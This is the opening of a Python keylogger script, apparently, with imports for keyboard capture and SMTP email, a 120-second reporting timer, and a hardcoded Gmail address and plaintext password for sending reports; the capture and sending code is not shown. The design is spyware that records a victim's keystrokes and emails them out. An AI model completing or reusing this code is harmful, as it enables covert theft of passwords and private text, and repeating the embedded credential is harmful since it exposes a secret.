import keyboard #allows us to access the keyboard of the device 
import smtplib #for sending emails using the SMTP service 
from threading import Timer #allows us to make a module run after a given amount of time 
from datetime import datetime #self explanatory...
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText 

SEND_REPORT_EVERY = 120
EMAIL_ADDRESS = "reubenjsykesx@gmail.com"
EMAIL_PASS = "*bBFWDCuo*DwFZuG8Fe4"


